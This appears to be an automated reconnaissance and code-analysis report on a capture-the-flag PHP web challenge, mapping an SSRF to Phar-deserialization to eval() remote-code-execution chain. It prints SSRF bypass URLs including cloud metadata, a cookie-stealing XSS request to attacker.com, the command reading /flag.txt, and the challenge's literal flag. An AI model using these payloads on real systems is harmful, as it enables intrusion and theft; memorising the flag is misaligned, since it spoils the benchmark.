# Pre-Reconnaissance Report

## Port Discovery (naabu)
Status: Skipped
[object Object]

## Network Scanning (nmap)
Status: success
Starting Nmap 7.97 ( https://nmap.org ) at 2025-10-31 11:50 -0700
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000028s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 993 closed tcp ports (conn-refused)
PORT      STATE SERVICE   VERSION
80/tcp    open  http      Caddy httpd
|_http-title: Site doesn't have a title.
|_http-server-header: Caddy
443/tcp   open  ssl/https
|_http-title: Site doesn't have a title.
631/tcp   open  ipp       CUPS 2.3
|_http-title: Home - CUPS 2.3.4
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: CUPS/2.3 IPP/2.1
8081/tcp  open  http      Apache httpd 2.4.56 ((Debian))
|_http-title: Hello
|_http-server-header: Apache/2.4.56 (Debian)
8888/tcp  open  http      SimpleHTTPServer 0.6 (Python 3.12.10)
| http-git: 
|   127.0.0.1:8888/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: \xE2\x9C\x85 Executive Summary and Report Cleanup: completed successf...
|_http-title: Directory listing for /
|_http-server-header: SimpleHTTP/0.6 Python/3.12.10
9999/tcp  open  http      SimpleHTTPServer 0.6 (Python 3.12.10)
|_http-title: Directory listing for /
|_http-server-header: SimpleHTTP/0.6 Python/3.12.10
49152/tcp open  http      Golang net/http server
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 401 Unauthorized
|     Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; script-src 'none'; script-src-elem 'none'; script-src-attr 'none'
|     Content-Type: text/plain; charset=utf-8
|     Tailscale-Cap: 115
|     Tailscale-Version: 1.82.5-tdec88625e-gec2eb9730
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: DENY
|     Date: Fri, 31 Oct 2025 18:50:18 GMT
|     Content-Length: 14
|     auth required
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port49152-TCP:V=7.97%I=7%D=10/31%Time=690504EA%P=arm-apple-darwin24.4.0
SF:%r(FourOhFourRequest,192,"HTTP/1\.0\x20401\x20Unauthorized\r\nContent-S
SF:ecurity-Policy:\x20default-src\x20'none';\x20frame-ancestors\x20'none';
SF:\x20script-src\x20'none';\x20script-src-elem\x20'none';\x20script-src-a
SF:ttr\x20'none'\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nTails
SF:cale-Cap:\x20115\r\nTailscale-Version:\x201\.82\.5-tdec88625e-gec2eb973
SF:0\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20DENY\r\n
SF:Date:\x20Fri,\x2031\x20Oct\x202025\x2018:50:18\x20GMT\r\nContent-Length
SF::\x2014\r\n\r\nauth\x20required\n")%r(GenericLines,67,"HTTP/1\.1\x20400
SF:\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n
SF:Connection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(GetRequest,192,"H
SF:TTP/1\.0\x20401\x20Unauthorized\r\nContent-Security-Policy:\x20default-
SF:src\x20'none';\x20frame-ancestors\x20'none';\x20script-src\x20'none';\x
SF:20script-src-elem\x20'none';\x20script-src-attr\x20'none'\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nTailscale-Cap:\x20115\r\nTailsca
SF:le-Version:\x201\.82\.5-tdec88625e-gec2eb9730\r\nX-Content-Type-Options
SF::\x20nosniff\r\nX-Frame-Options:\x20DENY\r\nDate:\x20Fri,\x2031\x20Oct\
SF:x202025\x2018:50:18\x20GMT\r\nContent-Length:\x2014\r\n\r\nauth\x20requ
SF:ired\n")%r(HTTPOptions,192,"HTTP/1\.0\x20401\x20Unauthorized\r\nContent
SF:-Security-Policy:\x20default-src\x20'none';\x20frame-ancestors\x20'none
SF:';\x20script-src\x20'none';\x20script-src-elem\x20'none';\x20script-src
SF:-attr\x20'none'\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nTai
SF:lscale-Cap:\x20115\r\nTailscale-Version:\x201\.82\.5-tdec88625e-gec2eb9
SF:730\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20DENY\r
SF:\nDate:\x20Fri,\x2031\x20Oct\x202025\x2018:50:18\x20GMT\r\nContent-Leng
SF:th:\x2014\r\n\r\nauth\x20required\n")%r(RTSPRequest,67,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\
SF:.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=
SF:utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.57 seconds


## Subdomain Discovery (subfinder)
Status: success
sbs.allsaintsschool.localhost
exchvm.nwcnet.localhost
naeu2.naeuinc.localhost
fndlync01.5ninesdata.localhost
mse-ca-mail.corp.mse.localhost
mail03.regency.localhost
mail.regency.localhost
server2.hunter.localhost
www.localhost
server02.counterintel.localhost
autodiscover.regency.localhost
mail02.regency.localhost
tools.sonoma.edu.localhost
mail.localhost
autodiscover.localhost
owa.regency.localhost


## Technology Detection (whatweb)
Status: success
[1m[34mhttp://localhost:8081[0m [200 OK] [1mApache[0m[[1m[32m2.4.56[0m], [1mHTML5[0m, [1mHTTPServer[0m[[1m[31mDebian Linux[0m][[1m[36mApache/2.4.56 (Debian)[0m], [1mIP[0m[[0m[22m::1[0m], [1mPHP[0m[[1m[32m8.0.30[0m], [1mTitle[0m[[1m[33mHello[0m], [1mX-Powered-By[0m[[0m[22mPHP/8.0.30[0m]

## Code Analysis
# Penetration Test Scope & Boundaries

**Primary Directive:** This analysis is strictly limited to the **network-accessible attack surface** of the application. All subsequent tasks must adhere to this scope.

### In-Scope: Network-Reachable Components
- Publicly exposed web pages and API endpoints
- Endpoints requiring authentication via the application's standard login mechanisms
- Developer utilities mistakenly exposed through routes or callable from in-scope code

### Out-of-Scope: Locally Executable Only
- Command-line interfaces (CLI tools)
- Development environment tooling
- CI/CD pipeline scripts or build tools
- Database migration scripts, backup tools, or maintenance utilities
- Local development servers, test harnesses, or debugging utilities

---

## 1. Executive Summary

This security assessment reveals a **CTF-style PHP-based SKU management system with CRITICAL vulnerabilities** that provide multiple paths to complete system compromise and flag exfiltration. The application employs a two-container microservices architecture with a publicly-accessible web frontend (port 8081) and a network-isolated backend service (port 4455), creating distinct trust boundaries that are systematically violated by design flaws.

The most severe finding is a **complete remote code execution chain** exploitable from the public internet: an SSRF vulnerability in the web application (`sku_url.php`) bypasses network isolation to reach the internal service, where an unauthenticated file upload endpoint (`sku_process`) accepts malicious Phar archives, and a dangerous deserialization endpoint (`read_sku.php`) triggers arbitrary code execution via an `eval()` gadget in the `CustomTemplate` class. This chain requires no authentication, no user interaction, and results in full server compromise with direct access to the CTF flag stored at `/flag.txt`.

Beyond the RCE chain, the application demonstrates a **complete absence of authentication and authorization controls**—every endpoint is publicly accessible with no login system, no session management, and no access control checks. The application also lacks fundamental security protections: no CSRF tokens, no rate limiting, no security headers (CSP, HSTS, X-Frame-Options), and no TLS/SSL encryption.

## 2. Architecture & Technology Stack

### Framework & Language

**PHP Version Split (Security Risk):**
- **Webapp container:** PHP 8.0 with Apache 2 (port 8081)
- **Service container:** PHP 7.4 with Nginx + PHP-FPM (port 4455) - **END OF LIFE** (no security patches since Nov 2022)

**Template Engine:** Twig 3.10.3 with sandbox security policy (bypassed in multiple endpoints)

**Database:** SQLite 3 via PDO (no authentication, no encryption)

**Containerization:** Docker Compose orchestrating two containers with distinct security profiles

**Critical Misconfiguration:** Service container enables `phar.readonly = Off` in PHP configuration, enabling Phar deserialization attacks

### Architectural Pattern

**Microservices with Trust Boundary Violation:**
- **Webapp (public):** PHP 8.0/Apache on 0.0.0.0:8081 - handles user interactions, SQLite database, Twig rendering
- **Service (isolated):** PHP 7.4/Nginx on 172.0.0.0/8:4455 - internal API, file uploads, Phar deserialization

**Trust Boundary:** Nginx restricts service to Docker internal network (`allow 172.0.0.0/8; deny all;`), but webapp's SSRF endpoint **intentionally bypasses** this isolation.

**CTF Flag Location:** Stored exclusively in service container at `/flag.txt`

### Critical Security Components

**1. Twig Sandbox (Systematically Bypassed):**
- **File:** `/app/index.php` lines 31-40
- **Issue:** Multiple endpoints create new Twig environments WITHOUT sandbox
- **Vulnerability:** Allows `raw` filter (disables HTML escaping) + SSRF content = XSS

**2. Nginx Network ACL (Bypassed by Design):**
- **File:** `/app/skumodel-srv/nginx.conf` lines 13-19
- **Rules:** `limit_except POST { deny all; }` + `allow 172.0.0.0/8; deny all;`
- **Bypass:** Webapp's SSRF endpoint provides public proxy to restricted service

**3. SQL Injection Protection (Effective):**
- All database operations use PDO prepared statements
- No SQL injection vulnerabilities identified

**4. Phar Extension (DANGEROUS):**
- **File:** `/app/skumodel-srv/Dockerfile` line 9
- **Setting:** `phar.readonly = Off`
- **Risk:** Enables RCE via Phar metadata deserialization

## 3. Authentication & Authorization Deep Dive

### Complete Absence of Authentication

**Finding:** **ZERO authentication controls** across entire application
- No `session_start()`, `setcookie()`, `$_SESSION` usage
- No JWT, OAuth, or credential validation
- No password validation or user management

**All Endpoints Are Public:**

**Main Application (Port 8081):**
1. `GET/POST /index.php` - Homepage (no auth)
2. `POST /sku_add.php` - Database insertion (unrestricted)
3. `POST /sku_delete.php` - **CRITICAL: Delete any record** (no confirmation)
4. `GET /sku_system.php` - List all records
5. `POST /sku_search.php` - Search database
6. `GET /sku_product_detail.php?id=X` - View details
7. `POST /sku_url.php` - **CRITICAL: SSRF endpoint** (no auth)

**Internal Service (Port 4455 - via SSRF):**
8. `POST /sku_transfer` - JSON endpoint
9. `POST /sku_validation` - Validation endpoint
10. `POST /sku_process` - **File upload** (accepts base64)
11. `POST /sku_read` - **CRITICAL: Phar deserialization → RCE**
12. `GET /backup/` - Directory listing + backup.zip

### Authentication API Endpoints

**Finding:** NO authentication endpoints exist
- ❌ No `/login`, `/logout`, `/register`, `/password-reset`
- ❌ No token refresh or verification endpoints

### Session Management

**Finding:** COMPLETELY ABSENT
- No session state persistence
- No cookies created
- No `HttpOnly`, `Secure`, or `SameSite` flags (N/A - no cookies exist)

**Cosmetic RandomHash:** 
- **File:** `/app/index.php` lines 13-23
- Generates random value but **never validated or used for access control**
- Purely display-only in HTML template

### Authorization Model

**Finding:** ZERO access controls
- No RBAC, ABAC, or ACLs
- No role/permission checks anywhere
- Every user has full admin privileges by default

**Destructive Operations Without Authorization:**
1. **Database Deletion:** `/app/sku_delete.php` - anyone can delete any record
2. **SSRF Exploitation:** `/app/sku_url.php` - unrestricted server-side requests
3. **File Upload:** `/app/skumodel-srv/sku_process.php` - arbitrary file uploads (via SSRF)

### SSO/OAuth/OIDC Flows

**Finding:** NOT IMPLEMENTED
- No OAuth 2.0, OIDC, or SAML integration
- No callback endpoints or state/nonce validation

## 4. Data Security & Storage

### Database Security

**Connection:** SQLite at `/var/db/database.db`
- **NO AUTHENTICATION** - File-based, no username/password
- **NO ENCRYPTION** - Plaintext storage
- **File Permissions:** Owned by www-data:www-data, world-readable

**Query Safety:** ✅ Parameterized queries prevent SQL injection

**Schema:**
```sql
CREATE TABLE skus (
    id INTEGER PRIMARY KEY,
    sku TEXT NOT NULL,
    name TEXT NOT NULL,
    description TEXT
)
```
- No audit trail columns
- No encryption at column level
- No tenant isolation

### Data Flow Security

**CTF Flag Storage (CRITICAL):**

1. **Source Code:** `/XBEN-092-24/.env` line 1
   ```
   FLAG="flag{736ec0da-d311-46ea-add6-605a4d1c1a9d}"
   ```

2. **Container Filesystem:** `/flag.txt` in service container
   - **File:** `/app/skumodel-srv/Dockerfile` lines 18-19
   - `ARG FLAG` + `RUN echo $FLAG > /flag.txt`
   - **Risk:** Flag in Docker image layers (visible via `docker history`)

3. **Exploitation Paths:**
   - RCE via Phar deserialization → `cat /flag.txt`
   - SSRF with file:// protocol (test bypass)
   - Container escape → filesystem access
   - Docker image inspection

**Data Leakage Points:**

1. **Debug Output:** `var_dump()` in `/app/skumodel-srv/read_sku.php` lines 15, 23
2. **Client IP Exposure:** Rendered in template (`{{ client_ip }}`)
3. **Session ID Display:** Random hash shown in HTML
4. **Error Messages:** PDO ERRMODE_EXCEPTION leaks schema details
5. **Backup File:** `/backup/backup.zip` accessible (2857 bytes)

### Encryption & Secrets Management

**Encryption:** NONE
- No data-at-rest encryption
- No TLS/SSL (HTTP only on ports 8081, 4455)
- No inter-container encryption

**Secrets Management (CRITICAL GAPS):**
- Flag stored in plaintext `.env` file
- Docker build-time ARG (persists in image metadata)
- No Docker secrets or runtime injection
- No secret rotation mechanism

## 5. Attack Surface Analysis

### External Entry Points (Port 8081)

**1. Main Page: GET/POST `/index.php`**
- Twig sandbox enabled but debug mode on
- XSS risk via sandbox bypass

**2. SKU Add: POST `/sku_add.php`**
- No auth, validation, or rate limiting
- Database pollution possible

**3. CRITICAL: SKU Delete: POST `/sku_delete.php`**
- **Anyone can delete any record**
- No confirmation or audit trail

**4-6. Data Operations:** `/sku_system.php`, `/sku_search.php`, `/sku_product_detail.php`
- Unrestricted data enumeration
- IDOR vulnerabilities

**7. CRITICAL: SSRF Endpoint: POST `/sku_url.php`**
- **File:** `/app/sku_url.php` lines 4-41
- **Input:** `POST['url']`
- **Validation (WEAK):**
  - Port must be 4455 (but ANY host accepted)
  - Only blocks exact 'localhost'/'127.0.0.1' (bypassed via `127.1`, `[::1]`)
- **Attack Vectors:**
  - Access internal service: `http://service:4455/sku_read`
  - Port scan internal network: `http://192.168.1.X:4455`
  - XSS chain: Fetch malicious HTML, render with `|raw` filter

### Internal Service (Port 4455 - via SSRF)

**8-10. JSON APIs:** `/sku_transfer`, `/sku_validation`
- Reconnaissance value only

**11. HIGH: File Upload: POST `/sku_process`**
- **File:** `/app/skumodel-srv/sku_process.php` lines 9-29
- **Input:** `POST['data']` (base64-encoded)
- **NO VALIDATION** - accepts ANY file type
- **Writes to:** `/tmp/{random}.jpg`
- **Risk:** Upload malicious Phar for deserialization

**12. CRITICAL: Phar Deserialization: POST `/sku_read`**
- **File:** `/app/skumodel-srv/read_sku.php` lines 10-26
- **Input:** `POST['file_path']`
- **Vulnerability Chain:**
  1. No path validation → path traversal
  2. `file_get_contents('phar://' . $filePath . '/manifest')` → reads Phar metadata
  3. `unserialize($content)` → unsafe deserialization
  4. `CustomTemplate::__wakeup()` → triggers `eval($this->data)`
- **RCE Gadget:** `/app/skumodel-srv/ReadClass.php` lines 12-14

**13. Information Disclosure: GET `/backup/`**
- Directory listing enabled (`autoindex on`)
- `backup.zip` downloadable

### Input Validation

**HTML Escaping (Partial):** Only username in index.php
**URL Validation (Bypassable):** Weak port/host checks
**SQL Injection Prevention (Effective):** ✅ Prepared statements
**File Upload Validation (ABSENT):** Zero checks
**Path Traversal Prevention (ABSENT):** No sanitization
**CSRF Protection (ABSENT):** No tokens anywhere

## 6. Infrastructure & Operational Security

### Secrets Management

**CRITICAL ISSUES:**
1. Flag in plaintext `.env` file
2. Docker build ARG exposes flag in image metadata
3. `/flag.txt` world-readable in container
4. No secret rotation
5. No encryption at rest

### Configuration Security

**Debug Mode:** Twig `'debug' => true` in production
**No Environment Separation:** Same config for dev/prod
**Missing Security Headers:**
- ❌ Strict-Transport-Security (HSTS)
- ❌ Content-Security-Policy (CSP)
- ❌ X-Frame-Options
- ❌ X-Content-Type-Options

### External Dependencies

**Composer Dependencies:**
- `twig/twig ^3.20` (installed: 3.10.3)
- Symfony polyfills

**Docker Base Images (CRITICAL):**
- `php:8.0-apache` - PHP 8.0 **END OF LIFE** (Nov 2023)
- `php:7.4-fpm` - PHP 7.4 **END OF LIFE** (Nov 2022)
- **No security patches** for known PHP vulnerabilities

### Monitoring & Logging

**Access Logs:** Apache/Nginx default (no structured logging)
**Error Logs:** Basic error logging
**Security Events:** NONE
- No authentication logs (N/A)
- No authorization failure logs
- No file access auditing
- No SSRF attempt detection
- No SIEM integration

## 7. Overall Codebase Indexing

**Structure:** Flat, function-oriented PHP with no MVC framework
- `/app/` - Public web application (8 PHP files)
- `/app/skumodel-srv/` - Internal service (5 PHP + ReadClass.php)
- `/app/templates/` - Twig templates (6 files)

**No Centralized Security Layer:** Each endpoint is self-contained with no middleware for auth/validation

**Configuration:** Hardcoded in PHP files, not externalized

**Testing Infrastructure:** ABSENT
- No tests/ directory
- No PHPUnit, PHPStan, or code quality tools
- Zero automated test coverage

**Docker Networking:**
- Two services on default bridge network
- Webapp: Port 8081 mapped to host
- Service: Port 4455 exposed internally only

## 8. Critical File Paths

### Configuration
- `/docker-compose.yml` - Container orchestration
- `/.env` - FLAG storage (plaintext)
- `/app/Dockerfile` - Webapp container
- `/app/skumodel-srv/Dockerfile` - Service container (phar.readonly=Off, FLAG injection)
- `/app/wwwconf/000-default.conf` - Apache config (no security headers)
- `/app/wwwconf/ports.conf` - Port 8081
- `/app/skumodel-srv/nginx.conf` - Network ACLs, POST-only rules

### Authentication & Authorization
- **NONE** - Zero auth files

### API & Routing
- `/app/index.php` - Main entry, Twig sandbox
- `/app/sku_add.php` - Database insert
- `/app/sku_delete.php` - **Unauthenticated deletion**
- `/app/sku_search.php` - Search
- `/app/sku_system.php` - List all
- `/app/sku_product_detail.php` - View details
- `/app/sku_url.php` - **SSRF endpoint (CRITICAL)**
- `/app/skumodel-srv/sku_process.php` - **File upload (CRITICAL)**
- `/app/skumodel-srv/read_sku.php` - **Phar RCE (CRITICAL)**

### Data Models & DB
- `/app/database.php` - SQLite connection, schema

### Dependencies
- `/app/composer.json` - Twig dependency
- `/app/composer.lock` - Locked versions

### Sensitive Data & Secrets
- `/.env` (line 1) - FLAG
- `/app/skumodel-srv/Dockerfile` (lines 18-19) - FLAG injection
- `/flag.txt` (container) - CTF target
- `/app/skumodel-srv/ReadClass.php` - **eval() gadget (CRITICAL)**

### Templates (XSS Risk)
- `/app/templates/sku_model.html.twig` (line 20) - **XSS via |raw filter**

### CTF Flag Storage
- `/.env` (line 1)
- `/app/skumodel-srv/Dockerfile` (lines 18-19)
- `/flag.txt` in service container

## 9. XSS Sinks and Render Contexts

### CRITICAL: Twig Raw Filter Bypass

**Sink:** `{{ sku_model|raw }}`
**File:** `/app/templates/sku_model.html.twig` line 20
**Context:** HTML Body

**Input Chain:**
1. `POST['url']` → `/app/sku_url.php` line 73
2. `SkuService::fetchSkuModel($url)` → lines 4-41
3. `file_get_contents($url)` → line 34
4. Returned to template as `sku_model`
5. Rendered with `|raw` filter (no escaping)

**Attack Vector:**
```http
POST /sku_url.php
url=http://attacker.com:4455/payload
```
Attacker server returns:
```html
<script>alert(document.cookie)</script>
```
Executed in victim's browser (XSS)

**No Other XSS Sinks Found**

## 10. SSRF Sinks

### CRITICAL: file_get_contents() with User-Controlled URL

**Function:** `file_get_contents($url)`
**File:** `/app/sku_url.php` line 34
**Input:** `POST['url']`
**Access:** Public internet (port 8081)

**Validation (WEAK):**
- Port must be 4455 (but ANY host accepted)
- Only blocks exact 'localhost'/'127.0.0.1'

**Bypass Techniques:**
1. Arbitrary host: `http://attacker.com:4455`
2. Internal IPs: `http://192.168.1.10:4455`
3. Loopback bypass: `http://127.1:4455`, `http://[::1]:4455`
4. Cloud metadata: `http://169.254.169.254:4455/latest/meta-data/`
5. DNS rebinding attacks

**Accessible Resources:**
1. **Internal Service (Primary):**
   - `http://service:4455/sku_process` - Upload Phar
   - `http://service:4455/sku_read` - Trigger RCE
   - `http://service:4455/backup/backup.zip` - Download backup

2. **Local Filesystem (test):**
   - `file:///flag.txt:4455` (may fail port validation)

3. **Internal Network:**
   - Docker containers, services on 172.0.0.0/8

### HIGH: Phar Stream Wrapper

**Function:** `file_get_contents('phar://' . $filePath . '/manifest')`
**File:** `/app/skumodel-srv/read_sku.php` line 14
**Input:** `POST['file_path']`
**Access:** Internal (port 4455), reachable via SSRF

**Validation:** NONE (only `file_exists()`)

**Attack Chain:**
1. Upload Phar via `/sku_process`
2. Trigger via `/sku_read` with `file_path=/tmp/abc123.jpg`
3. Phar metadata unserialized
4. `CustomTemplate::__wakeup()` → `eval($this->data)`
5. RCE: `system("cat /flag.txt")`

**Complete RCE Chain:**
```
SSRF → File Upload → Phar Deserialization → eval() → RCE → Flag
```

---

**PRE-RECON CODE ANALYSIS COMPLETE**

## Authenticated Scans

### SCHEMATHESIS
Status: skipped
No API schemas found

---
Report generated at: 2025-10-31T19:14:22.108Z